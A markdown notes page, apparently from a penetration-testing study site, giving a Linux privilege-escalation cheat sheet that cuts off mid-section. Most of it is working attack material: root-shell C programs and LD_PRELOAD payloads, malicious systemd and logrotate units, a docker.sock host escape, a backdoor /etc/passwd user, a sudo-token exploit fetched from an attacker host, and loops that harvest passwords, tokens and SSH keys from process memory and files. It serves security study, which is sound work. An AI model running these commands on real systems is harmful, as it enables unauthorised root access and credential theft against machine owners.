+++
title = 'Linux Privilege Escalation Enumeration'
date = 2026-10-30
type = 'notes'
weight = 10
toc = true
tags = ['linux', 'privilege-escalation', 'enumeration', 'sudo', 'suid']
+++

A consolidated reference for enumerating attack vectors on Linux targets, from first shell to root. Commands are grouped by category; exploitation primitives follow each enumeration section where relevant.

---

## Table of Contents

1. [Helpful Tools](#helpful-tools)
2. [Processes and Jobs](#processes-and-jobs)
3. [Kernel and OS](#kernel-and-os)
4. [User-Related](#user-related)
5. [Network Related](#network-related)
6. [Finding Interesting Files and Directories](#finding-interesting-files-and-directories)
7. [Process Memory and Sudo Token Reuse](#process-memory-and-sudo-token-reuse)
8. [Systemd Unit Abuse](#systemd-unit-abuse)
9. [Logrotate](#logrotate)
10. [`ld.so.preload` — Universal Linker Hijack](#ldsopreload--universal-linker-hijack)
11. [SUID / SGID / Capabilities](#suid--sgid--capabilities)
12. [Sudo Abuse](#sudo-abuse)
13. [Kernel and Userland Exploits](#kernel-and-userland-exploits)
14. [Container and Namespace Escape](#container-and-namespace-escape)
15. [D-Bus, Screen, and Tmux Session Abuse](#d-bus-screen-and-tmux-session-abuse)
16. [SUID Shared-Library and Linker Abuse](#suid-shared-library-and-linker-abuse)
17. [Writable `/etc/passwd` / `/etc/shadow`](#writable-etcpasswd--etcshadow)
18. [Credential Hunting](#credential-hunting)
19. [Open File Descriptors](#open-file-descriptors)
20. [Consolidated Enumeration One-Liners](#consolidated-enumeration-one-liners)
21. [Priority Quick Actions](#priority-quick-actions)
22. [Field Notes from the HTB List](#field-notes-from-the-htb-list)

---

## Helpful Tools

| Tool | Notes |
|---|---|
| [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) | Broad automated enumeration; default first pass |
| [LinEnum](https://github.com/rebootuser/LinEnum) | Lighter-weight shell alternative |
| [pspy](https://github.com/DominicBreuker/pspy) | Watches process spawns without root — exposes cron and systemd timer execution paths |
| [unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check) | Legacy file-permission auditing |
| [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) | Kernel exploit correlation |
| [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) | Linux smart enumeration |
| **CDK** | Container-specific enumeration and escape primitives |
| **deepce** | Docker/container enumeration from inside a container |
| **uptux** | Single-file Python script specialized in systemd, D-Bus, socket units, and writable unit paths |
| **SUDO_KILLER** | Focused on sudo misconfigurations, CVE detection, and token reuse |
| **privmap** | Graph-based path modeling — traces `www-data → writable logrotate config → root cron → root`, reporting paths rather than isolated findings |

```bash
# uptux
wget https://raw.githubusercontent.com/initstring/uptux/master/uptux.py
python3 uptux.py

# SUDO_KILLER
wget https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/SUDO_KILLER.sh
bash SUDO_KILLER.sh

# privmap
pip install privmap
sudo privmap
```

---

## Processes and Jobs

| Command | Description |
|---|---|
| `ps aux \| grep root` | See processes running as root |
| `./pspy64 -pf -i 1000` | View running processes with `pspy` |
| `cat /etc/crontab` | System-wide cron table |
| `ls -la /etc/cron.daily` | Check for daily Cron jobs |
| `ls -la /etc/cron.* /etc/at* /var/spool/cron/crontabs/ 2>/dev/null` | Enumerate all cron locations |
| `crontab -l` | Current user's cron |
| `grep -i cron /var/log/syslog /var/log/cron 2>/dev/null` | Enumerate cron jobs (second file on RHEL/CentOS) |
| `journalctl -u cron --no-pager` | Cron activity on journald-only hosts |
| `systemctl list-timers --all` | systemd timers — frequently missed because they are not cron |
| `atq` | List queued `at` jobs |
| `ls -la /var/spool/cron/atjobs/ 2>/dev/null` | `at` job files |
| `busctl --system list` | D-Bus services that may expose privileged methods |
| `lpstat` | Active or queued print jobs (sensitive information) |

**Cron exploitation notes:** If a cron job runs a script that calls another binary by relative name, the job's `PATH` or the script's writable directory becomes the target. `pspy` is the fastest way to confirm a job is firing and to observe its exact command line and working directory. `at`/`batch` jobs are cron-adjacent and less scrutinized — a root-scheduled `at` job running a script in a writable directory is exploitable exactly like a writable cron script:

```bash
atq
ls -la /var/spool/cron/atjobs/ 2>/dev/null
# if at is allowed via sudo:
echo '/bin/bash -c "chmod u+s /bin/bash"' | sudo at now
```

If `ps` looks empty due to `hidepid=invisible`, do not conclude there are no processes — use `ss`, `/proc`, and `pspy`.

---

## Kernel and OS

| Command | Description |
|---|---|
| `hostname` | Check hostname (confirm target is in scope) |
| `uname -a` | Kernel version |
| `uname -m` | Architecture — required before compiling any kernel exploit |
| `cat /proc/version` | Kernel version |
| `cat /etc/lsb-release` | OS version |
| `cat /etc/os-release` | OS version |
| `cat /etc/issue` | May contain version and release info |
| `lscpu` | Additional host information |
| `sudo -V` | Check sudo version (`sudo -V \| grep "Sudo ver"`) |
| `dpkg -l \| grep -i linux-image` | Installed kernels (Debian) |
| `rpm -qa kernel` | Installed kernels (RHEL) |
| `searchsploit "Linux Kernel" $(uname -r)` | Suggest kernel exploits |

---

## User-Related

| Command | Description |
|---|---|
| `id` | User and group membership |
| `whoami` | Current user |
| `groups` | Group membership — often reveals `docker`, `lxd`, `disk`, `adm`, `shadow` |
| `echo $PATH` | Current user's PATH |
| `w` / `who` | Logged-in users and terminal sessions |
| `ps aux` | Running processes (not logged-in users) |
| `history` | Current user's Bash history |
| `sudo -l` | Can the user run anything as another user? |

**Group membership** is frequently the shortest path to root: `docker` or `lxd` group membership is effectively root-equivalent on the host, and `adm` or `systemd-journal` can expose logs containing credentials.

---

## Network Related

| Command | Description |
|---|---|
| `ip a` | Network interfaces (`ip addr` also works; no `-a` option) |
| `ifconfig -a` | Network interfaces (legacy net-tools) |
| `hostname -I` | All IP addresses related to the host |
| `cat /etc/hosts` | Potential interesting hosts |
| `route` | Routing table |
| `netstat -rn` | Routing table |
| `arp -a` | Hosts the target has been communicating with |
| `cat /etc/resolv.conf` | Internal DNS → starting point for Active Directory queries |
| `ss -tulpn` | Listening services on TCP and UDP |
| `netstat -tulpn` | Listening services on TCP and UDP |
| `ss -anp` | Active connections and listening ports |
| `iptables -L -n -v 2>/dev/null` | Firewall rules |
| `nft list ruleset 2>/dev/null` | nftables ruleset |

### What to do after `ss -tulpn`

**Localhost-only services** cannot be reached directly, but you can tunnel:

```bash
ssh -R 8080:127.0.0.1:8080 attacker@ATTACKER_IP
# or use socat / chisel / ligolo
```

Common localhost-only panels: OliveTin 1337, Netdata 19999, motionEye 8765, VNC 5901, MySQL 3306. These often have weaker authentication than externally exposed services.

**Cross-reference ports with process owners:**

```bash
ss -tulpn | while read -r line; do
    pid=$(echo "$line" | grep -oP 'pid=\K[0-9]+')
    [ -n "$pid" ] && ps -o user= -p "$pid" | tr -d ' ' | xargs -I{} echo "{} -> $line"
done
```

A root-owned network daemon is a candidate for version-specific exploits, config-file read/write, or command injection.

---

## Finding Interesting Files and Directories

| Command | Description |
|---|---|
| `find / -type f \( -name '*_hist' -o -name '*_history' \) -exec ls -l {} \; 2>/dev/null` | All accessible history files |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null` | World-writeable directories |
| `find / -type d -name ".*" -ls 2>/dev/null` | Hidden directories |
| `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null` | Hidden files |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` | World-writeable files |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | SUID binaries owned by root |
| `find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null` | SGID binaries owned by root |
| `getcap -r / 2>/dev/null` | Binary file capabilities |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Config files |
| `find / -type f \( -name '*.conf' -o -name '*.config' \) -exec ls -l {} \; 2>/dev/null` | Config files |
| `find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\|snap\|share"` | `.sh` scripts |
| `grep -r "word" /starting-path` | Recursively inspect file contents for a string |
| `ls -l /tmp /var/tmp /dev/shm` | Temporary files |
| `find / -mmin -10 -type f 2>/dev/null` | Recently modified files — spots active cron jobs |
| `cat /etc/exports` | NFS exports — check for `no_root_squash` |
| `showmount -e localhost` | NFS exports visible from the target |

### NFS `no_root_squash`

If `/etc/exports` contains `no_root_squash`, the export is a direct root primitive: mount it from the attacker box as root, create a SUID shell or plant an SSH key, and execute it on the target.

### Log files as credential sources

```bash
grep -riE "password|passwd|secret|token" /var/log/auth.log /var/log/syslog 2>/dev/null
grep -iE "accepted|session opened|sudo.*COMMAND|password changed" /var/log/auth.log 2>/dev/null | tail -50
```

Logs frequently capture credentials when they are passed incorrectly, when a service logs a full command line, or when authentication failures include the attempted password.

---

## Process Memory and Sudo Token Reuse

If a user with sudo rights has run `sudo` recently, their sudo timestamp token is cached in memory. When `ptrace_scope` is `0`, you can read it and reuse it.

### Check the precondition

```bash
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = unrestricted ptrace (token reuse viable)
# 1 = restricted to descendants
# 2/3 = admin-only / no attach
```

If it returns `0`, and the target user has used sudo in the last 15 minutes (default timestamp timeout), the token is stealable.

### Exploit with `sudo_inject`

```bash
# on attacker box
wget https://github.com/nongiach/sudo_inject/blob/master/exploit.sh
python3 -m http.server 8000

# on target
wget http://ATTACKER:8000/exploit.sh
sh exploit.sh
/tmp/activate_sudo_token
sudo su
```

The script attaches to the user's process with `gdb` (or `/proc/PID/mem`) and extracts the token from memory.

### Enumerate who has used sudo recently

```bash
last -f /var/log/wtmp 2>/dev/null | head
grep -i "sudo" /var/log/auth.log 2>/dev/null | tail -20
```

### Fileless execution via `/proc/PID/mem` (DDexec)

If you can write to another process's memory (same UID, or `ptrace_scope` 0), you can execute a binary without ever writing it to disk. This bypasses `noexec` mounts, read-only filesystems, and file-name whitelisting.

```bash
wget https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh
bash ddexec.sh /path/to/your/elf
```

The script writes your ELF into `/proc/self/mem` (or another process's memory) and jumps to it.

---

## Systemd Unit Abuse

### Find writable unit files and drop-ins

```bash
find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system \
  -type f \( -name "*.service" -o -name "*.timer" \) -writable 2>/dev/null

find /etc/systemd/system -type d -name "*.d" -writable 2>/dev/null
```

Drop-in directories (`*.d`) are frequently overlooked and can override `ExecStart` or `User=` without touching the main unit file.

### Inspect what a root service actually executes

```bash
systemctl cat <service>          # active file
systemctl show <service>         # resolved values including defaults
```

Key fields to attack: `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`, `ExecReload=`, `WorkingDirectory=`, `EnvironmentFile=`, `User=`.

### Writable `ExecStart` binary

```bash
ls -la $(systemctl show -p ExecStart <service> | cut -d= -f2 | awk '{print $1}')
# if writable:
cp /bin/bash /path/to/service-binary
chmod u+s /path/to/service-binary
systemctl restart <service>
/path/to/service-binary -p
```

### Writable unit file

```ini
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/.rb && chmod u+s /tmp/.rb'
User=root
```

```bash
systemctl daemon-reload
systemctl restart <service>
/tmp/.rb -p
```

### `systemd-run` / `run0` transient units

On systems where you have `CAP_SYS_ADMIN` or a polkit rule allowing it, `systemd-run` starts a transient unit as root:

```bash
systemd-run --unit=evil --uid=0 /bin/bash -c 'chmod u+s /bin/bash'
/bin/bash -p
```

`run0` (systemd's sudo replacement) uses the same transient-unit mechanism. If it is present and unauthenticated for your user, it is a direct root path.

---

## Logrotate

Logrotate runs as root and executes `firstaction`/`lastaction` directives from config files. A writable config in `/etc/logrotate.d/` is a direct root-execution primitive.

```bash
ls -la /etc/logrotate.d/ /etc/logrotate.conf
find /etc/logrotate.d -writable 2>/dev/null
```

If you can write a config, append a block that runs a command:

```
/tmp/whatever {
    daily
    firstaction
        chmod u+s /bin/bash
    endscript
}
```

Wait for the daily cron (or trigger logrotate if permitted). The `logrotten` race (symlink/hardlink swap on the rotated file) is a separate primitive when the **log directory** is writable rather than the config.

---

## `ld.so.preload` — Universal Linker Hijack

If `/etc/ld.so.preload` is writable (or creatable), every dynamically linked binary — **including SUID binaries** — loads your shared object before anything else. This is one of the few techniques that works regardless of which SUID binary exists.

```bash
ls -la /etc/ld.so.preload 2>/dev/null
```

```c
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0); system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
echo "/tmp/evil.so" > /etc/ld.so.preload
```

Any subsequent execution of a SUID binary (e.g. `sudo -l`, `passwd`, or any setuid root program) drops you into a root shell.

---

## SUID / SGID / Capabilities

**SUID** is a special file permission for executable files which enables other users to run the file with effective permissions of the file owner. Instead of the normal `x` which represents execute permissions, you will see an `s` (to indicate **SUID**) special permission for the user.

For a quick win, find SUID binaries having the `root` user as the file's owner. HackTricks has a [page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/euid-ruid-suid) explaining EUID/RUID/SUID.

### Finding SUID / SGID binaries

```bash
find / -perm -4000 2>/dev/null                        # files with all bits in 4000 (SUID)
find / -perm /4000 2>/dev/null                        # files with any bit in 4000 (same result for single bit)
find / -perm /u+s 2>/dev/null                          # SUID via symbolic
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null   # SUID owned by root (the interesting ones)

find / -perm -2000 -type f 2>/dev/null                # SGID
find / -perm -6000 -type f 2>/dev/null                # both SUID and SGID
```

> **Kernel note:** The kernel ignores the setuid bit on shell scripts (shebang scripts), so a world-writable script with SUID is not directly exploitable. Focus on ELF binaries, and check `find / -perm -4000 -type f -newer ...` / package ownership to spot custom binaries that are not part of the distro.

### Linux capabilities

```bash
getcap -r / 2>/dev/null
capsh --print                       # list current capabilities
```

High-value capabilities to look for:

| Capability | Direct exploitation |
|---|---|
| `cap_setuid+ep` | A binary that can call `setuid(0)`. If it is an interpreter (Python, Perl), pass a one-liner. |
| `cap_dac_read_search+ep` | Read any file: `tar czf /tmp/shadow.tar.gz /etc/shadow` if `tar` has the cap. |
| `cap_dac_override+ep` | Write any file: overwrite `/etc/passwd` or a SUID binary. |
| `cap_sys_admin+ep` | Mount, `nsenter`, many container escapes. |
| `cap_sys_ptrace+ep` | Inject into root processes. |

Example: Python with `cap_setuid+ep`:

```bash
getcap $(which python3)
# if cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Example: `tar` with `cap_dac_read_search+ep`:

```bash
tar czf /tmp/shadow.tar.gz /etc/shadow 2>/dev/null
tar xzf /tmp/shadow.tar.gz -C /tmp/
unshadow /etc/passwd /tmp/etc/shadow > /tmp/hashes
```

### Exploiting SUID binaries

1. Compare the binary list against [GTFOBins](https://gtfobins.github.io/) — if listed, use the SUID section of its page.
2. Common one-liners (the `-p` flag is essential: most shells drop the effective UID when started from a SUID context):
   - `find / -exec /bin/sh -p \; -quit` (the binary is `find`)
   - `/usr/bin/bash -p` (if `bash` itself is SUID)
   - `nmap --interactive` → `!sh` (only old nmap versions)
   - `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p` (if you already have a SUID binary that can copy/chmod)
3. If no GTFOBins entry exists, inspect the binary:
   - `strings /path/to/binary | grep -iE 'pass|secret|system|exec|sh'`
   - `ldd /path/to/binary` — a non-standard library path can be hijacked (see [SUID Shared-Library and Linker Abuse](#suid-shared-library-and-linker-abuse))
   - `strace /path/to/binary` — look for relative file accesses and `execve()` calls
4. Check the binary version (`/path/to/binary --version`) — custom or outdated SUID binaries are frequently vulnerable to command injection or path hijacking.

### Creating a fast SUID privesc binary with C (no editor required)

```bash
cat <<'EOF' > /dev/shm/suid.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
EOF

gcc -m32 -static -march=generic -o /dev/shm/suid /dev/shm/suid.c

sudo chown root:root suid
sudo chmod 4755 /dev/shm/suid

# transfer the file then execute
/dev/shm/suid
```

---

## Sudo Abuse

`sudo -l` is usually the single highest-value enumeration command. Read the output carefully:

- `(ALL : ALL) ALL` — full root, just run `sudo su -` or `sudo -i`.
- `(root) NOPASSWD: /usr/bin/<binary>` — the binary runs as root without a password. Look it up in GTFOBins.
- `(root) SETENV: /usr/bin/<binary>` — you may set environment variables (e.g. `LD_PRELOAD`, `PYTHONPATH`, `BASH_ENV`) for that command.
- `env_keep+=...` in `sudo -l` output — variables preserved across `sudo`.
- `!authenticate` — no password required for the listed commands.

### GTFOBins-style escapes

```bash
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo less /etc/passwd                        # then !sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

For binaries allowed with a wildcard or that accept a file argument, also check for command injection through the file name (see [Cron exploitation notes](#processes-and-jobs)) and for loading a config/plugin from a writable path.

### Environment-variable vectors from `sudo -l`

**`SETENV` — `PYTHONPATH`:**

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

**`env_keep+=BASH_ENV`:**

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo
```

**`env_keep+=LD_PRELOAD` or `SETENV` — shared object constructor:**

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

### PATH hijacking through sudo

If `sudo -l` shows `env_keep+=PATH` or a writable entry in `secure_path`:

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh    # calls free → trojan
/bin/bash -p
```

### Notable sudo vulnerabilities

| CVE | Affected versions | Primitive |
|---|---|---|
| **CVE-2019-14287** | sudo < 1.8.28 | `sudo -u#-1 /bin/bash` bypasses user restriction |
| **CVE-2021-3156 (Baron Samedit)** | 1.8.2 – 1.9.5p1 | Heap overflow in `sudoedit`, e.g. `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` |
| **CVE-2023-22809** | 1.8.0 – 1.9.12p1 | `sudoedit` argument injection via `EDITOR`/`VISUAL` → edit arbitrary files |
| **CVE-2025-32463 ("chwoot")** | 1.9.14 – 1.9.17 | `sudo --chroot -R <writable-dir>`: plant `etc/nsswitch.conf` pointing at a malicious `libnss_*.so.2`; sudo loads and executes it **as root before the sudoers policy is evaluated**. Requires only *any* sudo rule. PoC: `CVE-2025-32463_chwoot` |
| **CVE-2025-32462** | sudo (host option) | Rules scoped to a different host incorrectly honoured locally; companion to 32463 |

Check immediately:

```bash
sudo -V | grep "Sudo ver"
sudo -l                            # any rule at all enables 32463
```

---

## Kernel and Userland Exploits

Kernel exploits are a last resort on exam targets: they can crash the target and cost you the machine. Prefer misconfigurations, credentials, and sudo/SUID abuse first.

1. Fingerprint the target:
   - `uname -a` and `cat /proc/version`
   - `uname -m` — architecture, required before compiling
   - `cat /etc/os-release`
   - `dpkg -l | grep -i linux-image` / `rpm -qa kernel`
2. Suggest exploits:
   - `searchsploit linux kernel <version>`
   - `./linux-exploit-suggester.sh`
   - `./lse.sh -l 2`
3. Common candidates:

| CVE / Name | Affected | Primitive |
|---|---|---|
| **CVE-2016-5195 — Dirty COW** | Linux 2.6.22 – 4.8.3 | Race condition → write to read-only files |
| **CVE-2021-3493 — overlayfs** | Ubuntu-specific kernels before 2021 fixes | Overlayfs LPE |
| **CVE-2021-4034 — PwnKit** | `pkexec` / polkit (many distros) | Memory corruption in `pkexec` |
| **CVE-2022-0847 — Dirty Pipe** | Linux 5.8 – 5.16.11, 5.15.25, 5.10.102 | Page-cache overwrite via `splice()` pipe |
| **CVE-2023-4911 — Looney Tunables** | glibc ≥ 2.34 | `GLIBC_TUNABLES` buffer overflow |
| **CVE-2024-1086 — nf_tables UAF** | Widely applicable on 2024-era kernels | Use-after-free in netfilter |
| **CVE-2024-21626 — runc leaked-fd** | Vulnerable runc versions | Container escape |
| **CVE-2025-6018 / 6019** | Chained LPEs | Two bugs exploited in tandem for root on most distros |
| **CVE-2026-23111** | nftables UAF | Exploited on Debian Bookworm/Trixie, Ubuntu 22.04/24.04 |
| **CVE-2026-31431 — Copy Fail** | Linux **4.17+**, many distros and containers | 4-byte write into page cache via `algif_aead` (AF_ALG); 732-byte PoC modifies a SUID binary in memory. **On-disk hash unchanged** |
| **CVE-2026-43284 — Dirty Frag** | Ubuntu 24.04.4, RHEL 10.1, openSUSE, CentOS Stream 10, AlmaLinux 10, Fedora 44 | Chains **xfrm-ESP** page-cache write with **RxRPC** page-cache write; no race condition, high success rate |
| **CVE-2026-46300 — Fragnesia** | Same XFRM/ESP surface as Dirty Frag | Third LPE in the same two-week disclosure wave |

**Why the 2026 page-cache bugs matter:** Copy Fail and Dirty Frag are deterministic logic flaws, not race conditions. They write into the page cache of root-owned SUID binaries without marking the page dirty — **hash-based monitoring and file-integrity tools cannot see the modification**.

```bash
# Copy Fail surface
cat /proc/crypto | grep -i aead
# Dirty Frag surface
lsmod | grep -E 'xfrm|rxrpc'
sysctl kernel.unprivileged_userns_clone
```

Before running any kernel exploit: confirm the target's architecture (`uname -m`), compile for that architecture, and keep a fallback shell open in case the exploit panics the kernel.

---

## Container and Namespace Escape

If your foothold is inside a container — increasingly common in labs and real engagements — host-root is often reachable without a kernel bug.

### 1. Detect that you are in a container

```bash
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup | grep -E "docker|lxc|kubepods"
cat /proc/self/status | grep Cap
capsh --print
```

### 2. Enumerate runtime sockets

```bash
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \
  -o -name podman.sock -o -name kubelet.sock -o -name buildkitd.sock \) 2>/dev/null

ss -xl | grep -E 'docker|containerd|crio|podman'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|BUILDKIT_HOST'
```

A reachable `docker.sock` is a direct host-root primitive:

```bash
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu chroot /host bash
```

If no Docker client is installed, the socket speaks HTTP:

```bash
curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu","Cmd":["/bin/sh","-c","cp /bin/bash /host/tmp/rb; chmod 4755 /host/tmp/rb"],
       "HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.24/containers/create
```

Then start the returned container ID via the same socket. The same logic applies to `containerd.sock` with `ctr`, and to `crio.sock` with `crictl`.

### 3. Enumerate dangerous capabilities inside the container

```bash
capsh --print
```

| Capability | Primitive |
|---|---|
| `CAP_SYS_ADMIN` | Mount, `nsenter`, cgroup release-agent abuse |
| `CAP_SYS_MODULE` | Load a kernel module |
| `CAP_SYS_PTRACE` | Process injection on host PID namespace if shared |
| `CAP_DAC_READ_SEARCH` | `open_by_handle_at` host file access |

### 4. Check for privileged mode and host mounts

```bash
cat /proc/self/mountinfo | grep -E " / | /host | /proc | /sys "
mount | grep -E " / | /host "
```

If `/` or `/host` is bind-mounted from the host, or if `/proc/sys/kernel/core_pattern` is writable, host-root is usually reachable through `core_pattern`, `uevent_helper`, or `modprobe_path` abuse.

### 5. Runtime binary primitives

```bash
runc spec
# edit config.json: "mounts": [{"type":"bind","source":"/","destination":"/","options":["rbind","rw"]}]
mkdir rootfs
runc run demo
```

Or with `ctr`:

```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t <image> esc bash
```

### 6. runc CVEs (2025)

These allow escape even when the daemon socket is **not** exposed, provided the attacker can influence container configuration or image content:

| CVE | Primitive |
|---|---|
| **CVE-2025-31133** | "Masked path" abuse / mount race conditions; public PoC |
| **CVE-2025-52565** | `/dev/console` mount race; write to hazardous procfs paths |
| **CVE-2025-52881** | Redirects writes to procfs, bypassing LSM labels (SELinux/AppArmor); targets `/proc/sys/kernel/core_pattern` and `/proc/sysrq-trigger` |

Fixed in **runc 1.2.8, 1.3.3, 1.4.0-rc.3** or later.

```bash
runc --version
ctr version 2>/dev/null
docker version --format '{{.Server.Version}}' 2>/dev/null
```

Exploitation requires launching containers with custom mount configurations — malicious or untrusted images/Dockerfiles are the delivery path.

---

## D-Bus, Screen, and Tmux Session Abuse

These are "no-exploit" vectors that are easy to miss but frequently decisive.

### D-Bus enumeration

```bash
busctl --system list
busctl status <service-name>
busctl tree <service-name>
dbus-send --system --print-reply --dest=org.freedesktop.DBus \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames
```

A privileged D-Bus service that exposes an unsafe method to unprivileged callers is a privilege-escalation channel. Enumerate services on the **system bus** first, note which ones run as root, and introspect their methods.

### Screen and tmux session hijacking

If root (or another higher-privileged user) leaves a detached `screen` or `tmux` session and its socket is accessible to you, you can attach to it and inherit that user's shell:

```bash
find /tmp /run -name 'screen.*' -o -name 'tmux-*' 2>/dev/null
ls -la /tmp/tmux-* 2>/dev/null

screen -r <session>
tmux -S /path/to/socket attach
```

Check `groups` for `screen` or `tmux` group membership, and check `/tmp` for sockets owned by higher-privileged users.

---

## SUID Shared-Library and Linker Abuse

### Enumerate library paths

```bash
ldd /path/to/suid-binary
readelf -d /path/to/suid-binary | grep -E "RPATH|RUNPATH"
```

If the binary has an `RPATH` or `RUNPATH` pointing to a writable directory, or if it loads a library from a relative path, you can plant a malicious shared object.

### Missing-library hijacking

If `ldd` reports a library as "not found", and the directory where the binary searches for it is writable, create a shared object with the expected name:

```bash
# example: binary expects libcustom.so.1 which is missing
cat > /tmp/libcustom.c <<'EOF'
#include <stdlib.h>
__attribute__((constructor)) void init() { setuid(0); setgid(0); system("/bin/sh"); }
EOF
gcc -shared -fPIC -o /tmp/libcustom.so.1 /tmp/libcustom.c
```

### Static SUID/SGID glibc library hijack (CVE-2025-4802)

glibc **2.27 – 2.38** allows **statically linked setuid/setgid binaries** to load malicious libraries from attacker-controlled paths — a class of binary often treated as safe from hijacking.

```bash
ldd /path/to/suid-binary 2>&1 | grep "not a dynamic executable"   # static SUID?
dpkg -l libc6 2>/dev/null | grep libc6
```

---

## Writable `/etc/passwd` / `/etc/shadow`

Classic, but still worth a one-line check because it is a 30-second root.

```bash
ls -la /etc/passwd /etc/shadow
```

If `/etc/passwd` is writable, add a root-equivalent user:

```bash
openssl passwd -1 -salt x pass
echo 'evil:$1$x$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su evil
```

If `/etc/shadow` is writable, replace the root hash or add a new entry. If it is readable (e.g. you are in the `shadow` group), `unshadow` and crack offline:

```bash
unshadow /etc/passwd /etc/shadow 2>/dev/null
```

---

## Credential Hunting

Before chasing a complex exploit, look for credentials that are already on the box.

### Shell history and dotfiles

```bash
grep -riE 'pass|pwd|secret|token|ssh|mysql|sudo' ~/.bash_history /home/*/.bash_history 2>/dev/null
cat ~/.zsh_history ~/.mysql_history ~/.psql_history 2>/dev/null
cat ~/.profile ~/.bashrc ~/.bash_profile 2>/dev/null
```

### SSH material

```bash
ls -la ~/.ssh /home/*/.ssh 2>/dev/null
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null
cat ~/.ssh/id_rsa ~/.ssh/authorized_keys ~/.ssh/known_hosts 2>/dev/null
```

### Web and application configs

```bash
grep -riE 'password|passwd|db_pass|api_key|secret' /var/www /opt /srv /etc 2>/dev/null
cat /etc/apache2/sites-enabled/* 2>/dev/null
cat /etc/nginx/sites-enabled/* 2>/dev/null
find / -name '.env' -type f -exec cat {} \; 2>/dev/null
```

### Logs

```bash
grep -riE "password|passwd|secret|token" /var/log/auth.log /var/log/syslog 2>/dev/null
grep -iE "accepted|session opened|sudo.*COMMAND" /var/log/auth.log 2>/dev/null | tail -50
```

### Live process environments

Every process's environment is readable by the same user (and by root). Services frequently pass passwords, tokens, and API keys via environment variables.

```bash
for pid in /proc/[0-9]*; do
    tr '\0' '\n' < "$pid/environ" 2>/dev/null | grep -iE 'pass|token|secret|key|api|cred|auth' && echo "  ^-- PID $pid"
done
```

For root-owned processes, you need root or `ptrace_scope=0` plus the same UID — but web/app processes running as your user are directly readable.

### Live process command lines

```bash
for pid in /proc/[0-9]*; do
    tr '\0' ' ' < "$pid/cmdline" 2>/dev/null | grep -iE 'pass|token|secret|key'
done
```

`pspy` catches short-lived processes (e.g. a cron job running `mysqldump -p...`) that `ps` misses.

### Keyrings / mimipenguin

```bash
secret-tool search --all user "" 2>/dev/null
./mimipenguin.sh        # requires root for full memory access
```

`mimipenguin` extracts plaintext passwords from memory (GNOME keyring, sshd, vsftpd, Apache) — the Linux equivalent of Mimikatz.

### Network management databases

If the host runs a network management platform (UniFi, Zabbix, Nagios, LibreNMS), its database often stores plaintext credentials for every monitored device:

```bash
mongo --port 27117 ace --eval 'db.setting.find({"key":"mgmt"}).forEach(printjson)'
# look for x_ssh_username / x_ssh_password
```

### Databases and backups

```bash
find / -name '*.sql' -o -name '*.bak' -o -name '*.old' -o -name '*.db' 2>/dev/null
```

### Environment files

```bash
cat /etc/environment ~/.profile ~/.bashrc 2>/dev/null
```

### Cloud metadata (from the target itself)

```bash
curl -s http://169.254.169.254/latest/meta-data/
```

### Retry recovered credentials

Any recovered password should immediately be retried with:

- `su - <user>`
- `sudo -l`
- `ssh <user>@localhost`
- Against other users on the same host

Password reuse is extremely common in exam labs. Also check `/etc/passwd` for accounts with a password hash.

---

## Open File Descriptors

If a root process has an open FD to a sensitive file and the FD is writable by you, you can write through it without needing the file's permissions. Rare but decisive.

```bash
